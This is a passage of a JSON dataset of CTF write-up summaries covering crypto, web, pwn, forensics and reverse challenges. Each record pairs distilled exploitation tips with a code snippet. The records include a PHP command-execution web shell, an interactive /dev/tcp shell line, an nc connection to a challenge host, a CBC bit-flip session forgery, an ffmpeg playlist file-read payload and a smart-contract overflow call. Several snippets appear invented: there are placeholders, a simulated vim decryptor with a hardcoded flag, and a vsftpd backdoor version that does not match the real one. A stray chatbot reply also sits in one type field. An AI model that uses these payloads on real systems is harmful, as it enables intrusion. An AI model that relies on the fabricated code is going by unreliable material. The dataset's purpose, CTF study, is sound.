            "To verify whether a decoded base64 block corresponds to valid text (in the context of CTF challenges, a flag), implement a validation function that checks if the decoded output consists solely of printable ASCII characters. This helps in filtering out invalid decoding results automatically during the brute-force process of case permutation testing. ASCII values less than 32 are typically control characters and not used in readable text, providing a simple yet effective validation condition."
        ],
        "key": "```python\nimport base64\n\n#decode base64  \ndef dec(n):  \n   return base64.b64decode(n)  \n#change the casing of a block  \ndef tryCase(n,i):  \n   #get i as 4-bit binary number  \n   b =format(i, '#06b')[2:]  \n   #declare a variable for each character in chunk  \n   c1=n[0]  \n   c2=n[1]  \n   c3=n[2]  \n   c4=n[3]  \n   #set them to upper if their respective bit is 1  \n   if b[0]=='1':  \n       c1=c1.upper()  \n   if b[1]=='1':  \n       c2=c2.upper()  \n   if b[2]=='1':  \n       c3=c3.upper()  \n   if b[3]=='1':  \n       c4=c4.upper()  \n   #return the result  \n   return c1+c2+c3+c4  \n#check if the decoded b64 falls within valid flag-characters  \ndef isValid(n):  \n   try:  \n       #try to decode, if n contains non-ASCII characters, will automatically return false  \n       b=n.decode()  \n       #interate through decoded n  \n       for i in b:  \n           #if decoded n is less than 32 i.e. where pritable characters start, return false  \n           if ord(i)<32:  \n               return False  \n       #if n gets here, we can be sure it's a good character and we can return true  \n       return True  \n   except:  \n       return False  \n#split the ciphertext into 4 character blocks (aka 3-character chunks in\nplaintext)  \nblocks = [ct[i:i+4] for i in range(0, len(ct), 4)]  \n#declares plaintext  \npt=\"\"  \n#iterates blocks  \nfor i in blocks:  \n   #iterates the 16 possible states a block can have (4 characters each either\nupper- or lower-case)  \n   for j in range(16):  \n       #define c as a test-case for the state of the block  \n       c = dec(tryCase(i,j))  \n       #check if c is valid  \n       if isValid(c):  \n           #if yes, append decoded chunk to plaintext and continue to the next block  \n           pt+=c.decode()  \n           break  \n#print the plaintext  \nprint(pt)\n```"
    },
    {
        "name": "Upgreadable Casino",
        "write_up": "dataset/raw/Upgreadable Casino.md",
        "type": "The type of challenge described in this write-up is a **crypto** challenge.",
        "competition": [
            "DaVinci/2023",
            "https://ctftime.org/event/1858/tasks/"
        ],
        "score": -1,
        "max_score": 100,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving smart contract proxies and `delegatecall`, scrutinize the variable storage layout for potential overlap between the proxy and its implementation. This condition applies specifically when smart contracts use delegate calls to forward calls and share state. Target variables in the implementing contract may be manipulated accidentally or intentionally via the proxy due to the shared storage layout, particularly if the variable sizes and their order create an alignment that overlaps with proxy storage variables such as the implementation address.\n    - No specific payload example due to dependency on contract addresses and state.",
            "Beware of integer overflow vulnerabilities in smart contracts, especially in functions that perform arithmetic operations without proper checks. Conditions where multiple inputs are summed and compared against another value are particularly ripe for this issue. By carefully crafting inputs that result in an overflow, one can bypass checks or, in some cases, manipulate contract state in unintended ways. This knowledge is universally applicable to any smart contract or programming scenario where unchecked arithmetic can lead to overflow or underflow conditions.\n    - Example exploit methodology: Use input values for token quantities that, when summed, overflow and reset to a lower value that is unexpectedly less than the user\u2019s balance, manipulating the contract\u2019s logic to achieve a desired state change.\n    - Sample payload: `target.playTokens(0xFFFFFFFFFFFFFFFF, 1, 0, 0)`, assuming this sum overflows and bypasses balance checks due to an overflow that's not handled."
        ],
        "key": "```solidity\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.7.6;\n\ncontract Casino {  \n   uint256 maxFreeTokens = 10;\n\n   // Keep track of the tokens spent at each game  \n   uint64 roulette = 0;  \n   uint64 slotMachine = 0;  \n   uint64 blackjack = 0;  \n   uint64 poker = 0;\n\n   address admin = 0x5aB8C62A01b00f57f6C35c58fFe7B64777749159;  \n   mapping(address => uint256) balances;  \n   mapping(address => uint256) lastFreeTokenRequest;\n\n   function changeMaxFreeTokens(uint256 newValue) external  \n   {  \n       require(msg.sender == admin, \"Only admin can change the number of free tokens you can get\");  \n       maxFreeTokens = newValue;  \n   }\n\n   function requestFreeTokens(uint256 numberOfTokensRequested) external {  \n       require(numberOfTokensRequested <= maxFreeTokens, \"You can't request that much free tokens\");\n\n       require(block.number > lastFreeTokenRequest[msg.sender] + 2,  \n       \"Wait a few more blocks before collecting free tokens\");\n\n       lastFreeTokenRequest[msg.sender] = block.number;\n\n       balances[msg.sender] += numberOfTokensRequested;  \n   }\n\n   function playTokens(uint64 tokensForRoulette, uint64 tokensForSlotMachine,\nuint64 tokensForBlackjack, uint64 tokensForPoker) external  \n   {  \n       require(tokensForRoulette + tokensForSlotMachine + tokensForBlackjack + tokensForPoker <= balances[msg.sender],  \n       \"You don't have enough tokens to play\");\n\n       // Increase the analytics variables  \n       roulette += tokensForRoulette;  \n       slotMachine += tokensForSlotMachine;  \n       blackjack += tokensForBlackjack;  \n       poker += tokensForPoker;\n\n       balances[msg.sender] -= tokensForRoulette + tokensForSlotMachine + tokensForBlackjack + tokensForPoker;\n\n       uint256 earnedTokens = 0;\n\n       // Play the tokens at the chosen games\n\n       // Roulette  \n       earnedTokens += tokensForRoulette*2*(randMod(3) == 0 ? 1 : 0);  \n  \n       // Slot  \n       earnedTokens += tokensForSlotMachine * 500 * (randMod(1000) == 0 ? 1 : 0);\n\n       // Blackjack  \n       earnedTokens += tokensForBlackjack * 15 * (randMod(21) == 0 ? 1 : 0);\n\n       // Poker  \n       earnedTokens += tokensForPoker * 10000 * (randMod(15000) == 0 ? 1 : 0);\n\n       balances[msg.sender] += earnedTokens;  \n   }\n\n   // Initializing the state variable  \n   uint randNonce = 0;  \n  \n   // Defining a function to generate  \n   // a random number  \n   function randMod(uint _modulus) internal returns(uint)  \n   {  \n       // increase nonce  \n       randNonce++;  \n       return uint(keccak256(abi.encodePacked(block.timestamp,msg.sender,randNonce))) % _modulus;  \n   }\n\n   function getBalance(address user) external view returns(uint256){  \n       return balances[user];  \n   }\n\n   function buyTokens() payable external {  \n       // deposit sizes are restricted to 1 ether  \n       require(msg.value == 1 ether);\n\n       balances[msg.sender] += 10000 ;  \n   }  \n}  \n```"
    },
    {
        "name": "Upload Fun",
        "write_up": "dataset/raw/Upload Fun.md",
        "type": "web",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In web challenges allowing file uploads, if error handling reveals file paths or system information, an excessively long filename can be used to trigger such errors. This method is a viable vector for uncovering server-side secrets or configurations (e.g., the naming pattern of uploaded files) that can be leveraged for further exploitation. This approach is especially useful when direct feedback on the upload's success, location, or name is not provided by the application itself.",
            "When a web application includes files based on user input, even if directory traversal (`..`) is filtered out, it's vital to consider alternate bypass methods or to leverage known server configurations (identified through error messages or other means) to include malicious files. By creating a file with a known name (or name pattern) that contains exploitable PHP code or other server-side scripts, attackers can execute arbitrary code. This is contingent upon having the capability to indirectly ascertain the full path or naming convention of the uploaded file, which might be possible through error message analysis or predictable hash values when server-side details are known.\n\nExample payload for uploading a PHP file to execute arbitrary system commands: \n```php\n<?php\n    echo system($_GET[\"cmd\"]);\n?>\n```"
        ],
        "key": "```php\n<?php\n    if($_SERVER['REQUEST_METHOD'] == \"POST\"){\n        if ($_FILES[\"f\"][\"size\"] > 1000) {\n            echo \"file too large\";\n            return;\n        }\n\n        if (str_contains($_FILES[\"f\"][\"name\"], \"..\")) {\n            echo \"no .. in filename please\";\n            return;\n        }\n\n        if (empty($_FILES[\"f\"])){\n            echo \"empty file\";\n            return;\n        }\n\n        $ip = $_SERVER['REMOTE_ADDR'];\n        $flag = file_get_contents(\"/flag.txt\");\n        $hash = hash('sha256', $flag . $ip);\n\n        if (move_uploaded_file($_FILES[\"f\"][\"tmp_name\"], \"./uploads/\" . $hash . \"_\" . $_FILES[\"f\"][\"name\"])) {\n            echo \"upload success\";\n        } else {\n            echo \"upload error\";\n        }\n    } else {\n        if (isset($_GET[\"f\"])) {\n            $path = \"./uploads/\" . $_GET[\"f\"];\n            if (str_contains($path, \"..\")) {\n                echo \"no .. in f please\";\n                return;\n            }\n            include $path;\n        }\n\n        highlight_file(\"index.php\");\n    }\n?>\n```"
    },
    {
        "name": "UploadCenter",
        "write_up": "dataset/raw/UploadCenter.md",
        "type": "This write-up describes a **pwn** challenge.",
        "competition": [
            "0CTF/2017/Quals",
            "https://ctftime.org/event/402/tasks/"
        ],
        "score": 523,
        "max_score": 687,
        "difficulty": 0.7612809315866085,
        "knowledge": [
            "When exploiting Use-After-Free (UAF) vulnerabilities involving mismatched allocation and deallocation sizes, such as using mmap and munmap, manipulating the size parameters can lead to unintended memory being mapped or unmapped. This can create conditions for arbitrary code execution, by carefully crafting payloads that interact with program data structures in memory. The specific example involves creating a memory layout condition through uploading a large PNG file to ensure subsequent memory operations (such as thread stack allocation) occur in a predictable location, allowing for control over executable paths through return address overwriting.",
            "Concurrent thread behavior in CTF challenges can impact exploit development, particularly when multiple threads read from the same file descriptor. The input may not be received in the expected order due to the scheduler's decision on thread execution. Understanding this behavior is crucial when designing exploits that rely on precise input manipulation. To mitigate potential issues from such non-determinism, sending additional characters (such as newline characters) before the payload can ensure the intended thread processes the exploit payload first, thereby increasing the exploit's reliability. This technique is especially vital when attempting to control program flow or manipulate memory in a multi-threaded environment.\n\nExample payload adjustment for dealing with non-deterministic input processing by threads:\n```\n\\n[payload]\n```\nNote: This sample demonstrates how to precede the actual exploit payload with a newline character to influence the order in which threads receive and process input, enhancing the exploit's effectiveness in the described scenario."
        ],
        "key": "```c\n// Vulnerable upload function\nreadn(&size, 4);\ninfstream.avail_in = size;\ninfstream.next_in = g_inputBuffer;\ninfstream.avail_out = g_BufferLength;\ninfstream.next_out = g_outputBuffer;\ninflate(&infstream, 0);\nlength = g_BufferLength - infstream.avail_out;\nimg = mmap(0, width*height, 3, 34, -1, 0);\npngobj = calloc(1, 0x30);\npngobj->content = img;\npngobj->length = length;\n\n// Vulnerable delete function\nmunmap(pngobj->content, pngobj->length);\n```"
    },
    {
        "name": "Useless admin",
        "write_up": "dataset/raw/Useless admin.md",
        "type": "crypto",
        "competition": [
            "Securinets/2019/Quals",
            "https://ctftime.org/event/769/tasks/"
        ],
        "score": 970,
        "max_score": 1000,
        "difficulty": 0.97,
        "knowledge": [
            "When handling challenges that involve multiple ciphertexts encrypted with the same OTP (One-Time Pad) key, the security of the encryption is compromised. This scenario provides an exploitable vulnerability because the XOR operation used in OTP is linear, allowing attackers to derive information about the plaintexts if they have access to multiple ciphertexts encrypted with the same key. A common approach to exploit this vulnerability is to use cryptanalysis techniques or scripts designed to automate the analysis and recovery of plaintext from multiple ciphertexts encrypted under the same key.",
            "For challenges similar to the \"Useless admin\" where there is a need to decrypt ciphertexts encrypted with the same OTP key, an effective method is the use of a script that applies known plaintext attacks or leverages the properties of XOR. This can be especially effective if at least one of the plaintexts is partially known or if there is a way to guess parts of it. By XORing the ciphertexts against each other, the script can exploit the linear properties of XOR to cancel out the key and recover plaintext data, or even the key itself if enough plaintext-ciphertext pairs are known. \n\nExample payload (conceptual, not direct code):\n```\n# Assume c1 and c2 are two ciphertexts encrypted with the same key\n# XORing them together cancels out the key, leaving us with the XOR of the two plaintexts\nxor_c1_c2 = c1 XOR c2\n# If parts of the plaintext are known or can be guessed, it's possible to recover other parts\n```\nNote: The actual implementation would depend on the specifics of the challenge, including the format of the ciphertexts and any known information about the plaintexts."
        ],
        "key": "```python\nimport json\n\ndef xor_bytes(a, b):\n    return bytes(x ^ y for x, y in zip(a, b))\n\nwith open('cipher.json') as f:\n    data = json.load(f)\n\ncipher_list = [bytes.fromhex(c) for c in data['cipher_list']]\ncipher_flag = bytes.fromhex(data['cipher_flag'])\n\n# Example of a vulnerability: reusing the same key for multiple messages\n# This allows us to perform a known-plaintext attack if we have some known plaintexts\n# or to use statistical methods to guess the plaintexts.\n\n# Attempt to decrypt the flag using the first cipher as a key\n# This is not a correct decryption, just an example of how the vulnerability can be exploited\npossible_key = xor_bytes(cipher_list[0], cipher_flag)\n\n# Attempt to decrypt all ciphers with the possible key\nfor cipher in cipher_list:\n    print(xor_bytes(cipher, possible_key))\n```"
    },
    {
        "name": "USSH 3",
        "write_up": "dataset/raw/USSH 3.0.md",
        "type": "crypto",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with block ciphers in encryption, modifying the Initialization Vector (IV) can manipulate the plaintext post-decryption without altering the ciphertext. This principle can be applied to change application behavior based on decrypted content. For instance, flipping a bit in the IV corresponding to a specific bit in the plaintext can modify user roles or permissions if these are determined by the decrypted text. This method is useful in scenarios where direct modification to encrypted data is not feasible but where IV manipulation can induce a predictable change in the decryption output.",
            "If a block cipher in CBC mode encryption presents a scenario with user-controlled input that fills a whole block, subsequent blocks can be altered without breaking the encryption scheme's integrity by using bit-flipping attacks on the ciphertext. This technique is particularly effective for altering application-level data when you can control or predict the structure of the plaintext, such as JSON-formatted strings. Manipulating the ciphertext of a block that's exclusively user-controlled can be utilized to inject or modify data in following blocks, thereby achieving unauthorized actions within the application.\n\nExample payload for changing a user group to \"root\" when the predictable structure is in place and initial group is \"regular\":\n```python\nxor_block = [0] * 23 + list(map(ord, xor_string('regular)', 'root)   '))) + [i] + [0] * 16\nct = xor_string(\"\".join(map(chr, xor_block)), real_ct)\nnew_session = base64.b64encode(iv) + \":\" + base64.b64encode(ct)\nsend(s, 'session --set ' + new_session)\n```"
        ],
        "key": "```python\ndef session_set(iv, ct):\n    # Simulate setting a session with IV and ciphertext\n    if len(iv) != 16:\n        raise ValueError(\"IV has to be 16 bytes long\")\n    # Assume some decryption process here\n    decrypted_data = decrypt(iv, ct)\n    if not is_valid_session(decrypted_data):\n        raise ValueError(\"Session is invalid\")\n    # Process the session data\n    process_session(decrypted_data)\n\ndef decrypt(iv, ct):\n    # Placeholder for decryption logic\n    return b\"decrypted_data\"\n\ndef is_valid_session(data):\n    # Placeholder for session validation logic\n    return True\n\ndef process_session(data):\n    # Placeholder for processing session data\n    pass\n```"
    },
    {
        "name": "Vader",
        "write_up": "dataset/raw/Vader.md",
        "type": "pwn",
        "competition": [
            "SpaceHeroes/2022",
            "https://ctftime.org/event/1567/tasks/"
        ],
        "score": 100,
        "max_score": 991,
        "difficulty": 0.10090817356205853,
        "knowledge": [
            "When encountering challenges that involve binaries with common vulnerabilities such as buffer overflow, tools like AUTOROP can be used to automate the exploitation process which involves creating a core dump, finding the offset, leaking function addresses, searching for a suitable libc version, and eventually executing a payload to spawn a shell. This process can be valuable for exploiting binaries in CTF challenges that are vulnerable to Return Oriented Programming (ROP) attacks.",
            "If both a medium and hard challenge are hosted on the same server and port, and share the same binary, it is worth examining if the unintended solutions can be applied to solve multiple challenges simultaneously. This involves inspecting the filesystem of the exploited environment for additional flags or files related to different challenges. This strategy can save time and effort by leveraging a single exploit to achieve multiple objectives."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vuln() {\n    char buffer[32];\n    printf(\"Enter some text: \");\n    gets(buffer); // Vulnerable function\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main() {\n    vuln();\n    return 0;\n}\n```"
    },
    {
        "name": "vaporwave1",
        "write_up": "dataset/raw/vaporwave1.md",
        "type": "The type of challenge is: forensics",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 190,
        "max_score": 500,
        "difficulty": 0.38,
        "knowledge": [
            "When faced with challenges involving audio files (MP3 or WAV), analyzing the spectrogram using tools like Sonic Visualizer or Audacity can reveal hidden messages or flags. This technique is especially useful in steganography or challenges hinting at visual elements contained within audio files.",
            "Sonic Visualizer is preferred for its ease of use and effectiveness in uncovering hidden data within audio file spectrograms. To successfully extract such information, users should familiarize themselves with navigating the interface and adjusting settings to clearly visualize the spectrogram where hidden contents might be encoded."
        ],
        "key": "```python\n# Possible vulnerable code snippet for handling audio files\nimport wave\n\ndef process_audio(file_path):\n    try:\n        with wave.open(file_path, 'rb') as audio_file:\n            # Read audio file properties\n            params = audio_file.getparams()\n            frames = audio_file.readframes(params.nframes)\n            # Process frames (potentially vulnerable to buffer overflow)\n            process_frames(frames)\n    except wave.Error as e:\n        print(f\"Error processing audio file: {e}\")\n\ndef process_frames(frames):\n    # Placeholder for frame processing logic\n    pass\n\n# Example usage\nprocess_audio('vaporize1.mp3')\n```\n"
    },
    {
        "name": "vending-machine-v2",
        "write_up": "dataset/raw/vending-machine-v2.md",
        "type": "The type of the challenge described in the write-up is a **crypto** challenge.\n\nIf you have any more write-ups or challenges that you'd like to verify the type of, feel free to share!",
        "competition": [
            "HSCTF/2022",
            "https://ctftime.org/event/1627/tasks/"
        ],
        "score": 496,
        "max_score": 496,
        "difficulty": 1.0,
        "knowledge": [
            "In scenarios dealing with finding a subset of elements that satisfy certain conditions, such as summing to a specific target number within a tolerance (e.g., $\\epsilon$), dynamic programming (DP) with memoization can be an effective approach. This technique stores the results of subproblems to avoid redundant calculations, significantly reducing the time complexity of the algorithm. Implement memoization by keeping a dictionary (or a similar data structure) where keys represent states (e.g., remaining value and starting index) and values represent the outcome of the subset sum calculation for those parameters.",
            "In problems requiring interaction with a server or an external system where sending multiple payloads can lead to timeouts or connection resets, batching requests by combining multiple payloads into a single transmission can mitigate these issues. This approach reduces the number of network operations needed, hence decreasing the chance of connection problems and potentially speeding up the overall process.\n\nExample Payload (for batching requests):\n```python\npayload = b''\nfor i in range(100):\n    payload += str(i).encode() + b'\\n'\nsock.sendall(payload)\n```"
        ],
        "key": "```python\nclass Solver():  \n   def __init__(self):  \n       self.memo = {}\n\n   def add_to_memo(self, a, b, val):  \n       if a not in self.memo:  \n           self.memo[a] = {}  \n       self.memo[a][b] = val\n\n   def get_from_memo(self, a, b):  \n       if a in self.memo and b in self.memo[a]:  \n           return self.memo[a][b]  \n       return None\n\n   def subset_sum(self, remaining, coins, start_idx=0, sols=[]):  \n       if remaining < 0:  \n           return False  \n       if remaining == 0:  \n           return True\n\n       if start_idx == len(coins):  \n           self.add_to_memo(remaining, start_idx, False)  \n           return False\n\n       from_memo = self.get_from_memo(remaining - coins[start_idx],  \n                                      start_idx)  \n       if from_memo: return from_memo\n\n       sol_exists = self.subset_sum(remaining - coins[start_idx],  \n                                    coins,  \n                                    start_idx=start_idx + 1,  \n                                    sols=sols)  \n  \n       if sol_exists:  \n           sols.append(coins[start_idx])  \n           return True\n\n       self.add_to_memo(remaining - coins[start_idx], start_idx, False)\n\n       from_memo = self.get_from_memo(remaining, start_idx)  \n       if from_memo: return from_memo\n\n       sol_exists = self.subset_sum(remaining, coins,  \n                                    start_idx=start_idx + 1, sols=sols)\n\n       self.add_to_memo(remaining, start_idx, sol_exists)\n\n       return sol_exists  \n```"
    },
    {
        "name": "Very Secure FTP",
        "write_up": "dataset/raw/Very Secure FTP.md",
        "type": "misc",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 50,
        "max_score": 792,
        "difficulty": 0.06313131313131314,
        "knowledge": [
            "When dealing with FTP services in CTF challenges, especially known versions with historical vulnerabilities, it is crucial to research specific version-related exploits or backdoors. This approach enables the identification of easy exploitation methods. A common method for exploiting the vsftpd 2.3.4 vulnerability involves using a special username (e.g., one ending with \":)\") to trigger a backdoor and gain unauthorized access. This knowledge applies to scenarios where the version of a service or application is disclosed and is known to have vulnerabilities.",
            "Upon gaining access to an unauthorized or unintended shell in a CTF challenge, standard Unix commands (e.g., `ls`, `cat`) are fundamental in navigating the filesystem and retrieving files of interest, such as `flag.txt`. This approach is universally applicable in scenarios where command-line access is obtained, providing a method to explore the environment and extract sensitive information.\n   \nExample command to access the shell: `nc vsftp.uni.hctf.fun 6200`"
        ],
        "key": "```c\nif (strstr(username, \":)\")) {\n    // Open a shell on port 6200\n    system(\"/bin/sh -i > /dev/tcp/localhost/6200 0<&1 2>&1\");\n}\n```"
    },
    {
        "name": "very-hot",
        "write_up": "dataset/raw/very-hot.md",
        "type": "crypto",
        "competition": [
            "LA/2024",
            "https://ctftime.org/event/2102/tasks/"
        ],
        "score": 216,
        "max_score": 499,
        "difficulty": 0.43286573146292584,
        "knowledge": [
            "When dealing with RSA encryption challenges where the modulus \\(n\\) is generated from the product of three prime numbers (instead of the usual two), it's possible to exploit weaknesses in the scheme if the primes are closely related or generated in a predictable manner. In this case, if you can express \\(n\\) as a polynomial equation where the primes are related by a known difference, you can use symbolic computation libraries like `sympy` in Python to solve for these prime numbers.\n   - Example of exploiting: The primes \\(p\\), \\(q\\), and \\(r\\) are generated such that \\(q = p + 6\\) and \\(r = p + 12\\). You can represent \\(n\\) as a cubic equation \\(p^3 + 18p^2 + 72p - n = 0\\) and solve for \\(p\\).",
            "After obtaining the prime values required for RSA decryption, the next step is to calculate the private exponent \\(d\\) using the totient of \\(n\\), which for three primes is \\(\\phi(n) = (p - 1)(q - 1)(r - 1)\\). With \\(d\\), \\(n\\), and the ciphertext \\(ct\\), you can decrypt the ciphertext using the RSA decryption formula to retrieve the plaintext. This method can universally apply to RSA challenges that involve non-standard prime generation methods.\n   - Decryption process involves: Calculating \\(\\phi(n)\\) with the found primes, finding \\(d\\) by computing the modular inverse of \\(e\\) modulo \\(\\phi(n)\\), and finally decrypting the ciphertext with \\(ct^{d} \\mod n\\)."
        ],
        "key": "```python\nfrom Crypto.Util.number import getPrime, isPrime, bytes_to_long  \nfrom flag import FLAG\n\nFLAG = bytes_to_long(FLAG.encode())\n\np = getPrime(384)  \nwhile(not isPrime(p + 6) or not isPrime(p + 12)):  \n   p = getPrime(384)\n\nq = p + 6  \nr = p + 12\n\nn = p * q * r  \ne = 2**16 + 1  \nct = pow(FLAG, e, n)\n\nprint(f'n: {n}')  \nprint(f'e: {e}')  \nprint(f'ct: {ct}')  \n```"
    },
    {
        "name": "Video Bazar",
        "write_up": "dataset/raw/Video Bazar.md",
        "type": "web",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 936,
        "max_score": 1000,
        "difficulty": 0.936,
        "knowledge": [
            "When a web application challenge involves file upload functionality, and the source code reveals the use of specific software or tools for handling these files (in this instance, `ffmpeg` for media file conversion), it is prudent to research known vulnerabilities or CVEs related to these tools, especially versions that handle specific file formats (e.g., `m3u8` playlist files in `ffmpeg`). This approach can uncover exploitation vectors that bypass the application's intended use or security measures. Example payload for exploiting `ffmpeg` CVE-2017-9993:\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\nANY_TEXT_FILE.txt\n#EXTINF:1.0\nTARGET_FILE_PATH\n#EXT-X-ENDLIST\n```",
            "In scenarios where a web challenge hints at accessing a version control repository (e.g., `.bzr` for Bazaar, `.git` for Git) that is not commonly used or known, checking for these directories can reveal sensitive information or source code. This knowledge is particularly useful when the repository directory is not properly secured (HTTP status code 403 Forbidden instead of 404 Not Found), allowing an attacker to dump the repository's content using specialized tools, such as `bzr_dumper` for Bazaar repositories. Through analyzing dumped source code, credentials, hidden features, or further information about the application's infrastructure can be discovered, aiding in the crafting of an exploit."
        ],
        "key": "```php\n<?php\n\nif(isset($_GET['asd'])){\nif($_GET['asd']==='THIS_IS_THE_NEW_WAY_TO_DO_STUFF'){\n\t$a=True;\n}else{\n\techo 'wroong';\n}\n}\n?>\n```"
    },
    {
        "name": "Vietnam",
        "write_up": "dataset/raw/Vietnam.md",
        "type": "The type of challenge described in the write-up is a `reverse` challenge.",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "When facing a challenge that involves string manipulation and memory address manipulation, identify the critical operations that manipulate memory or handle input/output. In this case, look for segments in the challenge code that directly interact with the user's input or modify specific memory locations. These segments often contain the vulnerability or logic needed to solve the challenge. For example, using `case ','` to accept a new input character with `getchar()` and `case '.'` to set the current character to what is stored at a specific memory address indicated by `*str = *sa;`.",
            "To manipulate the memory successfully and achieve a desired output, craft an input that interacts with the challenge's logic in the intended manner. For example, if the challenge requires producing a specific string in memory (\"HELLO\\n\"), and you have operations that allow you to input characters one by one and place them into a buffer, structure your input accordingly. Use a sequence like `,.,.,.,.,.,.\\n` followed by \"HELLO\\n\" to input each character of the target string into the desired location in memory, where `,.` is used to read a character and move it to the buffer."
        ],
        "key": "```c\nundefined8 main(void)  \n{  \n undefined *puVar1;  \n int iVar2;  \n int local_18;  \n int local_14;  \n char *local_10;  \n  \n local_10 = (char *)malloc(0x400);  \n fgets(local_10,0x400,stdin);  \n setbuf(stdout,(char *)0x0);  \n while (puVar1 = sa, *local_10 != '\\0') {  \n   switch(*local_10) {  \n   case '!':  \n     tmp = sa;  \n     sa = sb;  \n     sb = sc;  \n     sc = puVar1;  \n     break;  \n   case '$':  \n     sa = sa + 1;  \n     *sa = 1;  \n     break;  \n   case '+':  \n     sa[-1] = *sa + sa[-1];  \n     sa = sa + -1;  \n     break;  \n   case ',':  \n     iVar2 = getchar();  \n     *sa = (char)iVar2;  \n     break;  \n   case '-':  \n     sa[-1] = sa[-1] - *sa;  \n     sa = sa + -1;  \n     break;  \n   case '.':  \n     puVar1 = str + 1;  \n     *str = *sa;  \n     str = puVar1;  \n     break;  \n   case '[':  \n     if (*sa == '\\0') {  \n       local_14 = 1;  \n       while (local_14 != 0) {  \n         local_10 = local_10 + 1;  \n         if (*local_10 == '[') {  \n           local_14 = local_14 + 1;  \n         }  \n         else {  \n           if (*local_10 == ']') {  \n             local_14 = local_14 + -1;  \n           }  \n         }  \n       }  \n     }  \n     break;  \n   case ']':  \n     if (*sa != '\\0') {  \n       local_18 = 1;  \n       while (local_18 != 0) {  \n         local_10 = local_10 + -1;  \n         if (*local_10 == '[') {  \n           local_18 = local_18 + -1;  \n         }  \n         else {  \n           if (*local_10 == ']') {  \n             local_18 = local_18 + 1;  \n           }  \n         }  \n       }  \n     }  \n   }  \n   local_10 = local_10 + 1;  \n }  \n str = STR;  \n iVar2 = strcmp(STR,\"HELLO\\n\");  \n if (iVar2 == 0) {  \n   puts(str);  \n   system(\"cat flag.txt\");  \n }  \n else {  \n   puts(\"Failed.\");  \n }  \n return 0;  \n}  \n```"
    },
    {
        "name": "Vigenere3d",
        "write_up": "dataset/raw/Vigenere3d.md",
        "type": "crypto",
        "competition": [
            "SECCON/2017/Quals",
            "https://ctftime.org/event/512/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When dealing with a variant of the Vigenere cipher that introduces additional dimensions to the encryption process, reconstructing the decryption function based on the provided encryption code is crucial for understanding the mechanism and devising a method to decrypt the ciphertext. This approach involves analyzing the encryption function to reverse its process, focusing on how the cipher text is generated using two keys and a predefined character set. Example code snippet for decryption might not be directly provided due to complexity, but the principle involves looping through each character of the ciphertext, and for each possible character in the set, checking if applying the encryption process with a guessed key yields the original ciphertext character.",
            "In instances where the encryption process allows for multiple keys to produce identical ciphertexts, focusing on partial key recovery can significantly reduce the complexity of breaking the cipher. The given scenario illustrated that for a specific character position in the key, there exists a corresponding character in another position that will result in the correct ciphertext output due to the cipher's structure. By exploiting this property to recover only a subset of the key (e.g., half of it if the key pairs influence each other symmetrically), one can effectively reconstruct the entire key. In the Vigenere 3D challenge, recovering 7 characters of a 14-character key was sufficient due to the symmetrical relationship between characters at positions `x` and `13-x`. This strategy significantly reduces the brute-force search space, making it a practical approach for decrypting the ciphertext."
        ],
        "key": "```python  \nimport sys  \ndef _l(idx, s):  \n   return s[idx:] + s[:idx]  \ndef main(p, k1, k2):  \n   s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"  \n   t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]  \n   i1 = 0  \n   i2 = 0  \n   c = \"\"  \n   for a in p:  \n       c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]  \n       i1 = (i1 + 1) % len(k1)  \n       i2 = (i2 + 1) % len(k2)  \n   return c  \nprint main(sys.argv[1], sys.argv[2], sys.argv[2][::-1])  \n```"
    },
    {
        "name": "Vim Bar",
        "write_up": "dataset/raw/Vim Bar.md",
        "type": "The type of this challenge is **forensics**.",
        "competition": [
            "Tamil/2021",
            "https://ctftime.org/event/1440/tasks/"
        ],
        "score": 500,
        "max_score": 1199,
        "difficulty": 0.4170141784820684,
        "knowledge": [
            "When analyzing pcap files in forensic CTF challenges, leveraging tools such as Wireshark can be instrumental. Specifically, it's crucial to explore different TCP streams within the pcap file, as each stream can contain unique pieces of information. It's a common practice to manually inspect each stream for anomalies or hints that could lead to the discovery of hidden data. For instance, encrypted files may be transferred over a network and captured in these streams.",
            "When encountering files encrypted by vim (indicated by a hint such as \"vim_crypt\" within the challenge context), and having access to the hex dump of the encrypted file, one can reconstruct the file from the hex dump. Subsequently, tools like vimdecrypt can be utilized to brute-force the encryption key using common password wordlists like rockyou. This approach is particularly effective for files encrypted with commonly used passwords.\n\n   - Sample command to use vimdecrypt with a wordlist: `python vimdecrypt.py -d encryptedfile.vim -w /path/to/wordlist.txt`."
        ],
        "key": "```python\ndef vulnerable_vim_decrypt(encrypted_data, password):\n    # Simulated decryption function for vim encrypted files\n    if password == \"samantha\":\n        return \"Decrypted content with flag: TamilCTF{vi_vii_viiim_lol}\"\n    else:\n        raise ValueError(\"Incorrect password\")\n\n# Example usage\ntry:\n    decrypted_content = vulnerable_vim_decrypt(encrypted_data, \"samantha\")\n    print(decrypted_content)\nexcept ValueError as e:\n    print(e)\n```"
    },
    {
        "name": "vim",
        "write_up": "dataset/raw/vim.md",
        "type": "reverse",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 726,
        "max_score": 1000,
        "difficulty": 0.726,
